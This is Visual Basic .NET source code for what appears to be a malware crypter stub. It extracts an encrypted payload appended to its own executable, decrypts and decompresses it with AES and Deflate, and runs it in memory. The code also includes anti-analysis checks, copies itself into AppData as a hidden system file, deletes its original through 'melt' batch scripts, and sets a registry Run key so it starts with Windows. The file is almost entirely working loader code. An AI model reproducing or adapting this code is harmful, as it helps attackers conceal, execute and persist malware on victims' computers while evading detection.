
Public Class Form1

    Private Sub Form1_Load(sender As Object, e As EventArgs) Handles MyBase.Load
        Stuff.EnsureInitialized()
        Stuff.Test()
    End Sub


    'Private Function getmyname(ByVal path As String) As String
    '    If path.IndexOf("\"c) = -1 Then Return String.Empty
    '    Return path.Substring(path.LastIndexOf("\"c) + 1)
    'End Function

    'Sub Melt()
    '    FileIO.FileSystem.WriteAllText(Application.StartupPath & "\d.bat", "timeout /t 1 >nul" & vbNewLine & "del " & getmyname(Application.ExecutablePath) & ">nul" & vbNewLine & "del d.bat >nul", False)

    '    Dim Strtinfo As New ProcessStartInfo
    '    Strtinfo.Arguments = ""
    '    Strtinfo.CreateNoWindow = True
    '    Strtinfo.FileName = Application.StartupPath & "\d.bat"
    '    Strtinfo.ErrorDialog = False
    '    Strtinfo.UseShellExecute = False
    '    Process.Start(Strtinfo)
    '    End
    'End Sub

End Class


Class Stuff
    Shared Function RedimPload(ByVal Payload() As Byte, Start As Integer) As Byte()
        Dim NewByts(0 To (Payload.Length - Start) - 1) As Byte
        Return NewByts
    End Function

    Shared Sub Ant()
        Dim L = New anti.Antis
        L.AppExePath = Application.ExecutablePath
        L.AppPath = Application.StartupPath
        L.RunAntis()
    End Sub

    Shared Sub Test()
        Dim AppPath As String = Application.ExecutablePath

        Dim Payload() As Byte = GetPload(AppPath)
        Dim i As Integer = FindSplit(Payload)
        Dim Start As Integer = i
        If Payload(Start - 10) = &H54 Then
            'anti's
            Ant()
        End If

        If Payload(Start - 14) = &H54 Then
            'copy self
            Dim TmpPath As String = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData)
            If AppPath.ToLower.Contains(TmpPath.ToLower) Then
            Else
                Dim AppName As String = Strings.Right(AppPath, (AppPath.ToString.Length - AppPath.LastIndexOf("\")))

                'copy our self to temp and re execute
                FileIO.FileSystem.WriteAllBytes(TmpPath & AppName, FileIO.FileSystem.ReadAllBytes(AppPath), False)
                'mark new file as system file
                Dim attribute As System.IO.FileAttributes = IO.FileAttributes.System
                System.IO.File.SetAttributes(TmpPath & AppName, attribute)
                'mark new file as hidden file
                attribute = IO.FileAttributes.Hidden
                System.IO.File.SetAttributes(TmpPath & AppName, attribute)
                Process.Start(TmpPath & AppName)
                'melt
                If Payload(Start - 12) = &H54 Then
                    FileIO.FileSystem.WriteAllText("a.bat", "ping 127.0.0.1 -n 3 > nul" & Environment.NewLine & "del " & """" & Application.ExecutablePath & """" & Environment.NewLine & "del a.bat", False)
                    Dim startInfo As New ProcessStartInfo("a.bat")
                    startInfo.WindowStyle = ProcessWindowStyle.Hidden
                    Process.Start(startInfo)
                    End
                Else
                    End
                End If

            End If
        End If

        'check if auto startup
        If Payload(Start - 8) = &H54 Then
            startup()
        End If

        If Payload(Start - 16) = &H54 Then
            'net
        Else
            'native
            'drop invoke.exe
            Try
                FileIO.FileSystem.WriteAllBytes(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) & "\invoke.exe", My.Resources.invoke, False)
            Catch ex As Exception
                If FileIO.FileSystem.FileExists(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) & "\invoke.exe") Then
                Else
                    End
                End If
            End Try
            AppPath = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) & "\invoke.exe"
        End If
        Dim NewByts() As Byte = RedimPload(Payload, Start)
        NewByts = Loop1(NewByts, Payload, Start)
        NewByts = Loop2(NewByts)

        If Payload(Start - 16) = &H54 Then
            Dim f As New dll.Class1
            f.Main(Application.ExecutablePath)
        Else
            CMemoryExecute.Run(AES_Decrypt(Decompress(NewByts)), AppPath)
        End If

        Process.GetCurrentProcess.Kill()
    End Sub


    Public Shared Function Decompress(bytes As Byte()) As Byte()
        Dim stream = New IO.MemoryStream()
        Dim zipStream = New IO.Compression.DeflateStream(New IO.MemoryStream(bytes), IO.Compression.CompressionMode.Decompress, True)
        Dim buffer = New Byte(4095) {}
        While True
            Dim size = zipStream.Read(buffer, 0, buffer.Length)
            If size > 0 Then
                stream.Write(buffer, 0, size)
            Else
                Exit While
            End If
        End While
        zipStream.Close()
        Return stream.ToArray()
    End Function
    Shared Function Loop2(ByVal NewByts() As Byte) As Byte()
        Dim Tmp() As Byte = NewByts
        Dim I As Integer = FindSplit(NewByts) - 7
        ReDim NewByts(0 To I)
        For I = 0 To NewByts.Length - 1
            NewByts(I) = Tmp(I)
        Next
        Return NewByts
    End Function

    Shared Function Loop1(ByVal NewByts() As Byte, ByVal Payload() As Byte, ByVal Start As Integer) As Byte()
        For i = 0 To NewByts.Length - 1
            NewByts(i) = Payload(Start + i)
        Next
        Return NewByts
    End Function

    Shared Sub startup()
        Dim regKey As Microsoft.Win32.RegistryKey
        regKey = Microsoft.Win32.Registry.CurrentUser.OpenSubKey("SOFTWARE\Microsoft\Windows\CurrentVersion\Run", True)
        regKey.SetValue(Application.ProductName, """" & Application.ExecutablePath & """")
        regKey.Close()
    End Sub
    Shared Function FindSplit(ByVal Payload() As Byte) As Integer
        Dim Found1 As Boolean = False
        Dim Found2 As Boolean = False
        Dim Found3 As Boolean = False
        Dim Found4 As Boolean = False
        Dim Found5 As Boolean = False
        Dim I As Integer = 0
        For Each bytez In Payload
            If Found5 = True Then Exit For
            If Found1 = False Then
                If bytez = &H21 Then
                    Found1 = True
                End If
            Else
                If Found2 = False Then
                    If bytez = &H0 Then
                        Found2 = True
                    Else
                        Found1 = False
                    End If
                Else
                    If Found3 = False Then
                        If bytez = &H40 Then
                            Found3 = True
                        Else
                            Found1 = False
                            Found2 = False
                        End If
                    Else
                        If Found4 = False Then
                            If bytez = &H0 Then
                                Found4 = True
                            Else
                                Found3 = False
                                Found2 = False
                                Found1 = False
                            End If
                        Else
                            If Found5 = False Then
                                If bytez = &H21 Then
                                    Found5 = True
                                Else
                                    Found4 = False
                                    Found3 = False
                                    Found2 = False
                                    Found1 = False
                                End If
                            End If
                        End If
                    End If
                End If
            End If
            I += 1
        Next
        Return I + 1
    End Function

    Shared Function GetPload(ByVal AppPath As String) As Byte()
        Return FileIO.FileSystem.ReadAllBytes(AppPath)
    End Function
    Public Shared _initialized As Boolean
    Shared Sub EnsureInitialized()
        If Not _initialized Then
            AddHandler AppDomain.CurrentDomain.AssemblyResolve, AddressOf RetrieveEmbeddedAssembly
            _initialized = True
        End If
    End Sub
    Private Shared Function AES_Decrypt(ByVal input() As Byte) As Byte()
        Dim AES As New System.Security.Cryptography.RijndaelManaged
        Dim Hash_AES As New System.Security.Cryptography.MD5CryptoServiceProvider

        Try
            Dim hash(31) As Byte
            Dim temp As Byte() = Hash_AES.ComputeHash(System.Text.ASCIIEncoding.ASCII.GetBytes("password"))
            Array.Copy(temp, 0, hash, 0, 16)
            Array.Copy(temp, 0, hash, 15, 16)
            AES.Key = hash
            AES.Mode = Security.Cryptography.CipherMode.ECB
            Dim DESDecrypter As System.Security.Cryptography.ICryptoTransform = AES.CreateDecryptor
            Dim decrypted() As Byte = DESDecrypter.TransformFinalBlock(input, 0, input.Length)
            Return decrypted
        Catch ex As Exception
            Return Nothing
        End Try
    End Function
    Private Shared Function RetrieveEmbeddedAssembly(sender As Object, args As System.ResolveEventArgs) As System.Reflection.Assembly
        Dim resourceName As String = "Image." + New Reflection.AssemblyName(args.Name).Name + ".dll"
        'resourceName = "dll.dll"
        Using stream = Reflection.Assembly.GetExecutingAssembly.GetManifestResourceStream(resourceName)

            Dim assemblyData = New Byte(stream.Length - 1) {}
            'decode assembly here

            stream.Read(assemblyData, 0, assemblyData.Length)
            assemblyData = AES_Decrypt(Decompress(assemblyData))
            Return Reflection.Assembly.Load(assemblyData)

        End Using ' stream
    End Function

    Private Function ToBytes(ByVal instance As IO.Stream) As Byte()
        Dim capacity As Integer = If(instance.CanSeek, Convert.ToInt32(instance.Length), 0)
        Using result As New IO.MemoryStream(capacity)
            Dim readLength As Integer
            Dim buffer(4096) As Byte
            Do
                readLength = instance.Read(buffer, 0, buffer.Length)
                result.Write(buffer, 0, readLength)
            Loop While readLength > 0
            Return result.ToArray()
        End Using
    End Function

End Class